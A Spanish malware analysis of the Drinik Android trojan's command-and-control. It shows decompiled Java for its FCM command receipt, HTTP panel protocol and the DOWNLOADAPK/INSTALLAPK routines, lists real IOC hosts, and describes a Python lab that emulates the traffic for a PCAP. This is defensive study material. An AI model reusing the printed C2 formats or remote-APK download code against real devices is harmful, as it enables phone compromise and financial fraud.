Drinik, identificado por MITRE ATT&CK como [S1054](https://attack.mitre.org/software/S1054/), utiliza dos canales complementarios para el mando y control. La evolución y las capacidades de la familia fueron documentadas por Cyble en un [análisis conservado por Web Archive](https://web.archive.org/web/20221114031945/https%3A//blog.cyble.com/2022/10/27/drinik-malware-returns-with-advanced-capabilities-targeting-indian-taxpayers/). Las órdenes pueden llegar mediante Firebase Cloud Messaging (FCM), mientras que el registro de la víctima, el envío del token y los resultados funcionales se transmiten mediante peticiones HTTP a un panel propio. La URL de este panel se obtiene de la preferencia `API`; si no existe un valor almacenado, la muestra utiliza `http://gia.3utilities.com/iaserver.php`.

Para la captura se selecciona un flujo que permite observar [T1481.003, Web Service: One-Way Communication](https://attack.mitre.org/techniques/T1481/003/). FCM transporta la orden hacia el terminal, pero la respuesta funcional no regresa por ese servicio: la muestra la envía al panel mediante HTTP. La confirmación técnica que Firebase devuelve al emisor del mensaje no cambia esta interpretación, porque no constituye una respuesta de la aplicación comprometida.

El mismo flujo permite representar [T1407, Download New Code at Runtime](https://attack.mitre.org/techniques/T1407/). La orden `DOWNLOADAPK` contiene una URL elegida por el operador; `Oce` la entrega a `DownloadManager`, que guarda la respuesta como `Downloads/AApk.apk`. La muestra también dispone de una orden independiente, `INSTALLAPK`, que prepara ese fichero mediante `PackageInstaller` cuando Android permite instalar paquetes desde esta fuente. La descarga y la instalación no son, por tanto, una única operación automática.

El análisis se apoya en la APK abierta en JADX. El proyecto coincide con ella por el paquete `lincoln.auy.iAssist`, la etiqueta `iAssist`, la actividad principal `Ibn`, el servicio de accesibilidad `Oce` y el servicio FCM `ehy`.

| Artefacto estudiado       | Función                      | SHA-256                                                            |
| ------------------------- | ---------------------------- | ------------------------------------------------------------------ |
| APK `lincoln.auy.iAssist` | Aplicación analizada en JADX | `86acaac2a95d0b7ebf60e56bca3ce400ef2f9080dbc463d6b408314c265cb523` |

Los fragmentos siguientes proceden del código descompilado. Se han sustituido únicamente las cadenas resueltas y algunos nombres locales para mejorar su lectura; las condiciones, constantes y llamadas que determinan el tráfico se conservan.

### División de canales de red

La muestra interviene en cinco conversaciones lógicas. Algunas pertenecen al terminal y otras al lado del operador, distinción necesaria para no atribuir a la APK peticiones que solo existen en la infraestructura de FCM.

| Canal | Extremo y procedencia | Función |
|---|---|---|
| Firebase Installations | `firebaseinstallations.googleapis.com:443`, fijado por la biblioteca incluida | Obtención o renovación de la identidad de instalación y de su token de autenticación mediante HTTPS. |
| Registro y entrega FCM | Infraestructura de Google gestionada por Google Play Services | Obtención del token FCM y entrega cifrada de mensajes `data` a `FirebaseMessagingService`. |
| Publicación FCM | `fcm.googleapis.com:443`, utilizado por el panel o por el emulador | Envío, desde el lado del operador, de un mensaje dirigido al token de la víctima. La APK no construye esta petición. |
| Panel HTTP | URL almacenada en `API`; por defecto `gia.3utilities.com:80/iaserver.php` | Registro, estado, resultados, consultas auxiliares y subida de datos mediante formularios HTTP. |
| Descarga | URL incluida en `DOWNLOADAPK` | Recuperación de `AApk.apk` mediante `DownloadManager`. El esquema, el host y el puerto proceden de la orden. |

Los nombres anteriores requieren resolución DNS cuando se utilizan como dominios. El panel HTTP es el único extremo de la muestra cuyo valor predeterminado aparece en la configuración de `Oce`; el servidor de descarga queda bajo control del emisor del comando. En el laboratorio se selecciona `http://192.3.124.14/AApk.apk`. La dirección fue observada por Cyble como origen de una APK en una [campaña posterior de Drinik](https://cyble.com/blog/indian-taxpayers-face-a-multifaceted-threat-with-drinik-malwares-return/); la ruta `/AApk.apk` se conserva para reflejar el nombre local fijado por la muestra analizada.

La separación entre FCM y el panel HTTP define T1481.003. El servicio legítimo lleva la orden hasta `ehy`, mientras que `Oce` envía el resultado a `iaserver.php`. Una orden recuperada mediante el sondeo HTTP alternativo `getClientCMD` no demostraría esta subtécnica por sí sola, porque en ese caso la entrada y el retorno utilizarían el mismo canal propio.

### Tratamiento de cadenas ofuscadas

La clase `Mbo` oculta la mayoría de los literales mediante `bhx()`. El método divide la cadena por el separador ` 5-`, convierte cada elemento a entero y suma siete antes de interpretarlo como carácter:

```java
static String bhx(int guard, String encoded) {
    String[] values = encoded.split(" 5-");
    StringBuilder decoded = new StringBuilder();

    if (guard > values.length) {
        return "";
    }

    for (String value : values) {
        decoded.append((char) (Integer.parseInt(value) + 7));
    }
    return decoded.toString();
}
```

El primer argumento solo actúa como una comprobación de longitud; no participa en la transformación de cada carácter. Este mecanismo permite recuperar, entre otros valores, `CMD`, `processCMD`, `processCMDdirect`, `API`, `Token`, `insertServerCMD`, `DOWNLOADAPK`, `INSTALLAPK`, `http://gia.3utilities.com/iaserver.php` y `AApk.apk`. No se trata de cifrado aplicado al tráfico, sino de una ofuscación local de cadenas.

### Estructura general del canal HTTP

El servicio de accesibilidad `lincoln.auy.iAssist.Oce` concentra el despacho de órdenes y las comunicaciones con el panel. Durante `onCreate()` crea varias colas de Volley y carga la URL desde las preferencias. Tras resolver las cadenas ofuscadas, las instrucciones relevantes son:

```java
this.bns = Volley.newRequestQueue(this);
this.bnq = Volley.newRequestQueue(this);
this.je = Volley.newRequestQueue(this);

adu = this.fp.getString(
    "API",
    "http://gia.3utilities.com/iaserver.php"
);
```

La variable estática `adu` conserva la URL utilizada por `lp()`. El valor predeterminado emplea HTTP claro sobre TCP/80, aunque una preferencia `API` escrita previamente puede sustituir la URL completa. El método `lp()` crea una petición Volley de tipo `POST`; la subclase devuelve sin modificaciones el mapa recibido como parámetros:

```java
private StringRequest lp(
        String operation,
        Map<String, String> params,
        Context context) {
    return new StringRequest(
        Request.Method.POST,
        adu,
        new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                dww(operation, response);
            }
        },
        new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                dwy(operation, error.toString());
            }
        }
    ) {
        @Override
        protected Map<String, String> getParams() {
            return params;
        }
    };
}
```

La función `ne()` incorpora después la petición a la cola indicada. Volley codifica los elementos de `getParams()` como un formulario, por lo que una operación genérica presenta esta forma semántica:

```http
POST /iaserver.php HTTP/1.1
Host: gia.3utilities.com
Content-Type: application/x-www-form-urlencoded

CMD=<operacion>&Uid=<uid>&<campo_adicional>=<valor>
```

El campo `CMD` selecciona la operación del panel y `Uid` identifica a la víctima. Los demás parámetros dependen de la llamada. El registro del token FCM utiliza `Token`:

```http
POST /iaserver.php HTTP/1.1
Host: gia.3utilities.com
Content-Type: application/x-www-form-urlencoded

CMD=Token&Uid=<uid>&Token=<token_fcm>
```

Los resultados y mensajes de estado emplean `insertServerCMD` y el campo `ServerCMD`. El despachador construye confirmaciones con el comando recibido, un resultado y el terminador `##-##`; otras rutinas, como `cao()`, envían mensajes directos con una marca temporal:

```http
POST /iaserver.php HTTP/1.1
Host: gia.3utilities.com
Content-Type: application/x-www-form-urlencoded

CMD=insertServerCMD&Uid=<uid>&ServerCMD=D:::<fecha> -- <mensaje>##-##
```

Además de estas dos operaciones, el código prepara otros formularios para el mismo panel.

| Valor de `CMD` | Función observada |
|---|---|
| `Activate` | Registra o activa la víctima con su token, identificador, estado de accesibilidad y datos básicos del dispositivo. |
| `Ping` | Envía una baliza con `Uid` y `AccStat`; la respuesta puede contener `cmddata`. |
| `ScreenState` | Comunica el estado de la pantalla. |
| `UpdateAccStat` | Actualiza el estado del servicio de accesibilidad. |
| `R4VSent` | Informa del avance del flujo de verificación móvil. |
| `readdeviceVerificationStatus` | Consulta el estado de verificación y procesa una respuesta separada por `:::`; esta respuesta puede proporcionar la URL de la primera descarga. |
| `Sms` | Envía datos de SMS acumulados junto con los campos auxiliares previstos por la muestra. |
| `FileUpload` | Transfiere un fichero codificado mediante `encodedFile`, `fileName` y, de forma opcional, `Bucket`. |
| `INSPECTION` | Envía información de inspección de interfaz. |
| `getClientCMD` | Recupera órdenes mediante sondeo HTTP como alternativa a FCM. |
| `getLogingStat` | Consulta el estado de inicio de sesión mantenido por el panel. |

Las respuestas no comparten un formato único. `dww()` interpreta JSON para algunas operaciones, cadenas delimitadas por `:::` para otras y respuestas textuales de éxito en casos concretos. Por ello, el nombre de operación que `lp()` entrega al callback es necesario para seleccionar el analizador correspondiente.

### Estructura general del canal FCM

La APK no publica mensajes en FCM. Esa acción corresponde al lado del operador, que ya debe conocer el token comunicado por la víctima. En el laboratorio, el panel emulado representa la publicación mediante una petición HTTPS a la API HTTP v1 de FCM:

```http
POST /v1/projects/<project_id>/messages:send HTTP/1.1
Host: fcm.googleapis.com
Content-Type: application/json

{
  "message": {
    "token": "<token_fcm>",
    "data": {
      "CMD": "DOWNLOADAPK:::http://192.3.124.14/AApk.apk"
    }
  }
}
```

Esta petición describe el mensaje lógico que construye el emisor; no es tráfico generado por Drinik. Firebase entrega después el mensaje al terminal por un canal TLS gestionado por Google Play Services. Sin descifrado, la captura de ese canal muestra los extremos, el transporte y el intercambio TLS, pero no el valor de `data.CMD`.

El callback de la aplicación recibe un mapa `data` equivalente a:

```json
{
  "data": {
    "CMD": "<comando>"
  }
}
```

El despachador utiliza `:::` para separar el nombre y los argumentos:

```text
<nombre_comando>:::<arg1>:::<arg2>
```

También acepta colas con varios comandos y retardos:

```text
CMD1:::arg1####1000##-##CMD2:::arg1:::arg2
```

El separador `##-##` divide órdenes y `####` asocia un retardo a la orden precedente. Antes de procesar la cola, el código restaura tres secuencias escapadas: `#D#` representa `:::`, `#A#` representa `####` y `#B#` representa `##-##`.

Entre las órdenes reconocidas se encuentran las siguientes:

| Comando en `data.CMD` | Función observada |
|---|---|
| `DOWNLOADAPK:::<url>` | Entrega la URL a `DownloadManager` y fija el destino `Downloads/AApk.apk`. |
| `INSTALLAPK` | Inicia una sesión de `PackageInstaller` para el fichero ya descargado, siempre que la aplicación pueda solicitar instalaciones. |
| `PERMISSIONS:::<modo>` | Abre o automatiza los flujos de permisos previstos por el servicio de accesibilidad. |
| `KEEPDEVICEAWAKE` | Modifica el estado usado para mantener el dispositivo activo. |
| `CLICKS:::<coordenadas>` | Solicita gestos de pulsación mediante el servicio de accesibilidad. |
| `CHECKOVERLAY` | Comprueba los overlays activos y prepara el estado correspondiente. |
| `CONNECT` | Reactiva la rutina de conexión del servicio principal. |
| `ABORTSEQUENCE` | Interrumpe la secuencia de acciones en curso. |
| `KILLSOUND` | Ejecuta la rutina destinada a silenciar el dispositivo. |
| `DEFOREGROUNDIFY` | Modifica el estado de primer plano del servicio. |
| `UNBLOCK_NON_CONTACT_CALLS` | Desactiva el bloqueo de llamadas de números ajenos a los contactos. |
| `FORWARDSMS` y `812` | Preparan el reenvío de SMS; `812` se transforma en `FORWARDSMS`. |
| `BLOCKSMS`, `UNBLOCKSMS` y `400` | Cambian el estado de bloqueo de SMS; `400` actúa como alias de desbloqueo. |
| `DELETE_FILE:::<ruta>` | Intenta borrar el fichero indicado y comunica el resultado. |
| `IDLESTATE` | Comprueba el estado interactivo del dispositivo. |
| `Ping` | Activa la rutina local de baliza. |

La tabla resume capacidades del despachador, no una secuencia que deba ejecutarse completa. El flujo seleccionado utiliza `DOWNLOADAPK`; `INSTALLAPK` se analiza por separado para delimitar el efecto local posterior.

### Registro y mantenimiento del token FCM

El panel necesita conocer un token FCM antes de poder dirigir un mensaje a la víctima. En una instalación sin identidad válida almacenada, la biblioteca Firebase Installations incluida en la APK crea primero una instalación mediante `FirebaseInstallationServiceClient`. El cliente fija HTTPS, el dominio de Firebase y la ruta del proyecto. La representación lógica del cuerpo se muestra sin la compresión GZIP que aplica la biblioteca:

```http
POST /v1/projects/<project_id>/installations HTTP/1.1
Host: firebaseinstallations.googleapis.com
Content-Type: application/json
Content-Encoding: gzip
Cache-Control: no-cache
X-Android-Package: lincoln.auy.iAssist
X-Android-Cert: <huella_del_certificado>
x-goog-api-key: <firebase_api_key>

{
  "fid": "<firebase_installation_id>",
  "appId": "<google_app_id>",
  "authVersion": "FIS_v2",
  "sdkVersion": "a:17.0.1"
}
```

Una respuesta correcta proporciona el identificador de instalación, el token de actualización y un token de autenticación:

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "name": "projects/<project_id>/installations/<firebase_installation_id>",
  "fid": "<firebase_installation_id>",
  "refreshToken": "<fis_refresh_token>",
  "authToken": {
    "token": "<fis_auth_token>",
    "expiresIn": "<ttl>"
  }
}
```

Cuando el token de autenticación ha caducado, la misma clase utiliza el `refreshToken` en una operación independiente:

```http
POST /v1/projects/<project_id>/installations/<firebase_installation_id>/authTokens:generate HTTP/1.1
Host: firebaseinstallations.googleapis.com
Content-Type: application/json
Authorization: FIS_v2 <fis_refresh_token>
x-goog-api-key: <firebase_api_key>

{
  "installation": {
    "sdkVersion": "a:17.0.1"
  }
}
```

La creación de la instalación y la renovación no tienen que repetirse en cada arranque: Firebase reutiliza el estado válido almacenado. Una vez disponible la identidad FIS, `GmsRpc.getToken()` prepara el registro FCM y delega el transporte en Google Play Services. El objeto lógico contiene estos valores:

```text
scope=*
sender=<gcm_defaultSenderId>
subtype=<gcm_defaultSenderId>
gmp_app_id=<google_app_id>
gmsv=<google_play_services_version>
osv=<android_sdk>
app_ver=<version_code>
app_ver_name=<version_name>
firebase-app-name-hash=<hash>
Goog-Firebase-Installations-Auth=<fis_auth_token>
appid=<firebase_installation_id>
cliv=fcm-23.0.6
Firebase-Client-Log-Type=<valor_opcional>
Firebase-Client=<valor_opcional>
```

Este `Bundle` expresa los parámetros entregados a Google Play Services; el código de la APK no permite convertirlo en una petición HTTP propia de Drinik. La respuesta lógica contiene `registration_id=<token_fcm>`, que termina llegando al callback `ehy.onNewToken()`.

La clase `ehy`, que hereda de `FirebaseMessagingService`, guarda el token y marca su envío como pendiente:

```java
public void onNewToken(String token) {
    super.onNewToken(token);

    this.fp = getSharedPreferences("lincoln.auy.iAssist.zero", 0);
    this.fp.edit().putString("Token", token).apply();
    this.fp.edit().putBoolean("TokenSent", false).apply();

    if (this.fp.getBoolean("SystemActive", false)) {
        startService(
            new Intent(this, Oce.class)
                .putExtra("processCMD", "Token:::" + token)
        );
    }
}
```

La llamada exacta cambia a `startForegroundService()` cuando las notificaciones están deshabilitadas. Si `SystemActive` todavía es falso, el token permanece en preferencias; `Oce.onStartCommand()` comprueba después que exista, que `TokenSent` continúe a falso y que haya transcurrido el intervalo de reintento antes de volver a despachar `Token:::<valor>`.

El método `eil()` convierte ese comando interno en el formulario destinado al panel:

```java
private void eil(Context context, String token) {
    HashMap<String, String> params = new HashMap<>();
    params.put("Uid", this.fp.getString("UID", ""));
    params.put("Token", token);
    params.put("CMD", "Token");

    this.fp.edit()
        .putLong("TokenLastSent", System.currentTimeMillis())
        .apply();

    ne(context, lp("Token", params, this), this.je, false);
}
```

La secuencia de habilitación del canal push queda así delimitada: Firebase proporciona la identidad y el token FCM, la aplicación conserva ese token y `Oce` lo comunica al panel mediante el POST HTTP `CMD=Token`. Solo después el lado del operador dispone del identificador necesario para publicar una orden dirigida a esa instalación.

### Recepción de comandos por FCM

La recepción se implementa en `ehy.onMessageReceived()`. El código exige que el mapa `data` contenga `CMD`. Si el valor incluye los separadores de cola, utiliza el extra `processCMDdirect`; para una orden simple utiliza `processCMD`. El servicio se inicia en primer plano cuando las notificaciones están deshabilitadas y por la vía ordinaria en caso contrario. El flujo normalizado es:

```java
public void onMessageReceived(RemoteMessage message) {
    if (message.getData().isEmpty()) {
        return;
    }

    String command = Objects.requireNonNull(
        message.getData().get("CMD")
    );
    String extra = command.contains("##-##") || command.contains("####")
        ? "processCMDdirect"
        : "processCMD";

    Intent intent = new Intent(this, Oce.class)
        .putExtra(extra, command);

    if (NotificationManagerCompat.from(this).areNotificationsEnabled()) {
        startService(intent);
    } else {
        startForegroundService(intent);
    }
}
```

Para combinar T1481.003 y T1407 se utiliza una orden simple:

```json
{
  "data": {
    "CMD": "DOWNLOADAPK:::http://192.3.124.14/AApk.apk"
  }
}
```

El método `Oce.onStartCommand()` entrega `processCMD` a `aes()`. El despachador separa el comando por `:::` y, en la rama `DOWNLOADAPK`, pasa la URL a `btz()`:

```java
if ("DOWNLOADAPK".equals(commandName)) {
    if (parts.length > 1) {
        btz(
            "downloadComplete",
            parts[1].trim(),
            false,
            DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED
        );
    }
}
```

El tercer argumento es relevante: la rama almacena `installAfterDownload=false`. Antes de encolar la transferencia, `btz()` despacha dos limpiezas internas, restablece el estado de descarga y registra dinámicamente `Tbk` para `DOWNLOAD_COMPLETE`:

```java
private void btz(
        String completionKey,
        String url,
        boolean installAfterDownload,
        int notificationVisibility) {
    IntentFilter filter = new IntentFilter(
        "android.intent.action.DOWNLOAD_COMPLETE"
    );

    aes(1L, 0, "DELETE_FILE:::AApk.apk:::0", 1L);
    this.bud = new Tbk();
    aes(1L, 0, "DELETE_FILE:::iAssist.apk:::0", 1L);

    this.fp.edit().putBoolean(completionKey, false).apply();
    this.fp.edit()
        .putBoolean("installAfterDownload", installAfterDownload)
        .apply();
    registerReceiver(this.bud, filter);

    DownloadManager.Request request = new DownloadManager.Request(
        Uri.parse(url)
    );
    request.setNotificationVisibility(notificationVisibility);
    request.setDestinationInExternalPublicDir(
        Environment.DIRECTORY_DOWNLOADS,
        "AApk.apk"
    );
    ((DownloadManager) getSystemService("download")).enqueue(request);
}
```

Las dos órdenes `DELETE_FILE` recorren el mismo despachador y pueden producir mensajes de resultado hacia el panel. Como Volley y `DownloadManager` trabajan de forma asíncrona, sus POST y el comienzo de la descarga pueden intercalarse en la captura; el orden de las llamadas Java no fija por sí solo el orden final de todos los segmentos TCP.

Una vez encolada la transferencia, el propio `aes()` construye el acuse funcional de `DOWNLOADAPK` mediante `insertServerCMD`. Este mensaje confirma que la orden se ha procesado y que la descarga se ha programado; no demuestra que se hayan recibido todos los bytes:

```http
POST /iaserver.php HTTP/1.1
Host: gia.3utilities.com
Content-Type: application/x-www-form-urlencoded

CMD=insertServerCMD&Uid=<uid>&ServerCMD=<estado>DOWNLOADAPK:::http://192.3.124.14/AApk.apk has been executed - <resultado>##-##
```

La transferencia posterior se dirige al extremo incluido en la orden. Para el valor controlado del laboratorio se espera:

```http
GET /AApk.apk HTTP/1.1
Host: 192.3.124.14

HTTP/1.1 200 OK
Content-Type: application/vnd.android.package-archive
Content-Length: <longitud>

<contenido_inerte_con_formato_de_apk>
```

Cuando Android emite `DOWNLOAD_COMPLETE`, `Tbk` marca la descarga como completada y obtiene el nombre de paquete del fichero almacenado:

```java
if ("android.intent.action.DOWNLOAD_COMPLETE".equals(intent.getAction())) {
    this.fp.edit().putBoolean("downloadComplete", true).apply();
    this.fp.edit().putString(
        "downloadedPackageName",
        new Oce().ded(
            Environment.getExternalStoragePublicDirectory(
                Environment.DIRECTORY_DOWNLOADS
            ).getAbsolutePath() + File.separator + "AApk.apk",
            context
        )
    ).apply();

    if (this.fp.getBoolean("firstDownloadStarted", false)) {
        startService(
            new Intent(context, Oce.class)
                .putExtra(
                    "processCMD",
                    "SendMessage:::firstDownloadCompleted!"
                )
        );
        this.fp.edit().putBoolean("firstDownloadCompleted", true).apply();
        this.fp.edit().putBoolean("firstDownloadStarted", false).apply();
    }
}
```

La bandera `firstDownloadStarted` no se activa en la rama FCM de `DOWNLOADAPK`. El código la establece cuando la respuesta HTTP a `readdeviceVerificationStatus` aporta el primer `downloadLink`, o cuando `onServiceConnected()` retoma ese enlace almacenado. Por ello, un `DOWNLOADAPK` recibido directamente por FCM garantiza la programación de la descarga y su acuse genérico, pero solo genera `firstDownloadCompleted!` si ese estado previo ya estaba activo.

Cuando la condición se cumple, `SendMessage` llama primero a `cao()` y produce un mensaje directo:

```http
POST /iaserver.php HTTP/1.1
Host: gia.3utilities.com
Content-Type: application/x-www-form-urlencoded

CMD=insertServerCMD&Uid=<uid>&ServerCMD=D:::<fecha> -- firstDownloadCompleted!##-##
```

Después, la orden interna continúa hasta la confirmación genérica del despachador, por lo que puede aparecer otro POST que indique la ejecución de `SendMessage`. La finalización de la descarga puede generar así más de un retorno HTTP, pero ninguno debe confundirse con la transferencia del APK.

La instalación pertenece a otra rama. `INSTALLAPK` comprueba `PackageManager.canRequestPackageInstalls()` y solo entonces invoca `elw()`. Este método crea una sesión, copia `Downloads/AApk.apk` mediante `elz()` y confirma la sesión con un `PendingIntent` dirigido a `Tbk`:

```java
private void elw() {
    PackageInstaller installer = getPackageManager().getPackageInstaller();
    PackageInstaller.Session session = installer.openSession(
        installer.createSession(new PackageInstaller.SessionParams(
            PackageInstaller.SessionParams.MODE_FULL_INSTALL
        ))
    );

    elz(session);

    Intent status = new Intent(this, Tbk.class);
    status.setAction("lincoln.auy.iAssist.emd");
    session.commit(
        PendingIntent.getBroadcast(this, 11, status, <flags>)
            .getIntentSender()
    );
}
```

El receptor abre la confirmación de Android cuando el estado es `STATUS_PENDING_USER_ACTION`, registra el éxito o el error en preferencias y no genera por sí mismo una conexión nueva. En el PCAP, T1407 queda demostrado por la descarga de los bytes solicitados; la posterior sesión de instalación es un efecto local y requiere una orden y permisos independientes.

### Secuencia comunicativa

La secuencia representa el flujo de red seleccionado y conserva como condicional el aviso asociado a la primera descarga:

```mermaid
sequenceDiagram
    participant V as Terminal Android
    participant N as DNS
    participant F as Firebase y FCM
    participant C as Panel HTTP
    participant D as Servidor de descarga

    V->>N: Consulta A de firebaseinstallations.googleapis.com
    N-->>V: Direccion de Firebase
    V->>F: HTTPS POST de alta de la instalacion FIS
    F-->>V: Identidad y tokens FIS
    V->>F: Registro FCM gestionado por Google Play Services
    F-->>V: Token FCM

    V->>N: Consulta A de gia.3utilities.com
    N-->>V: Direccion del panel
    V->>C: HTTP POST con CMD Token
    C-->>V: Respuesta HTTP

    C->>F: HTTPS POST messages send con data CMD
    F-->>C: Confirmacion tecnica de FCM
    F->>V: Entrega TLS del mensaje FCM
    V->>V: ehy entrega DOWNLOADAPK a Oce
    V->>V: Oce prepara la limpieza y encola DownloadManager

    par Retornos HTTP asincronos
        V->>C: POST insertServerCMD con resultados y acuse
        C-->>V: Respuestas HTTP
    and Descarga del APK
        V->>N: Consulta A del host recibido en la orden
        N-->>V: Direccion del servidor de descarga
        V->>D: HTTP GET de AApk.apk
        D-->>V: Contenido del APK
    end

    V->>V: Tbk procesa DOWNLOAD_COMPLETE
    opt firstDownloadStarted ya estaba activo
        V->>C: POST insertServerCMD con firstDownloadCompleted
        C-->>V: Respuesta HTTP
        V->>C: POST insertServerCMD con el acuse de SendMessage
        C-->>V: Respuesta HTTP
    end
```

### Laboratorio de generación del PCAP

El laboratorio reproduce el flujo mediante un cliente y varios servicios Python aislados; no ejecuta la APK. El resolutor controlado asigna direcciones diferenciadas a los nombres utilizados por el escenario. El emulador representa Firebase Installations, el registro FCM, la publicación del operador y la entrega del mensaje por un canal TLS similar a `mtalk`. El panel y el servidor de descarga utilizan HTTP claro, de acuerdo con las URL seleccionadas.

| Entidad | Dirección y servicio | Procedencia |
|---|---|---|
| Víctima emulada | `10.105.4.10` | Dirección privada asignada al cliente dentro de la topología aislada. |
| Resolutor DNS | `8.8.8.8:53` | Dirección publicada para Google Public DNS; el servicio se emula dentro del *namespace* y no se contacta con Google. |
| Firebase | `172.217.114.4:443` y `108.177.15.188:5228` | Respuestas A obtenidas el 20 de agosto de 2026 para `firebaseinstallations.googleapis.com` y `mtalk.google.com`. Son infraestructura legítima de Google y no IOC de Drinik. |
| Panel de Drinik | `198.12.107.13:80` | IOC asociado con `gia.3utilities.com` y publicado por Cyble en la referencia empleada para el análisis. |
| Servidor de descarga | `192.3.124.14:80` | IOC publicado por Cyble para una campaña de Drinik que descargaba `Child.apk`; el laboratorio lo combina de forma explícita con la ruta `/AApk.apk` requerida por este escenario. |

La API FCM del laboratorio funciona sobre HTTP/1.1 protegido mediante TLS y el canal de entrega usa un protocolo de líneas sintético. Ambos conservan la causalidad y el contenido lógico necesarios para el análisis, pero no reproducen el protocolo interno completo de Google Play Services. El registro `drinik-sslkeys.log`, almacenado junto al PCAP, permite descifrar las conexiones TLS de esta ejecución en Wireshark.

El cliente emulado inicia `firstDownloadStarted` para incluir el aviso opcional de finalización. Es un estado controlado del laboratorio: en la muestra, esa bandera procede de la ruta inicial basada en `readdeviceVerificationStatus`, no de la orden FCM `DOWNLOADAPK`. La captura combina ambas ramas con esta condición explícita y no representa una instalación real. El servidor de descarga entrega contenido inerte y la ruta de `PackageInstaller`, al ser local y estar separada, queda fuera del tráfico generado.

Este escenario está automatizado en `python-labnet` con el identificador `drinik`. La ejecución, la captura conjunta de los dos puntos de red y la recopilación de los secretos TLS se describen en la [guía central de laboratorios Python](Laboratorios%20Python.md).

La captura se realiza en los puntos definidos por la topología: la entidad víctima y el tramo del C2 hacia Firebase. De este modo se conserva tanto la secuencia recibida por la muestra como la publicación del panel que la desencadena.
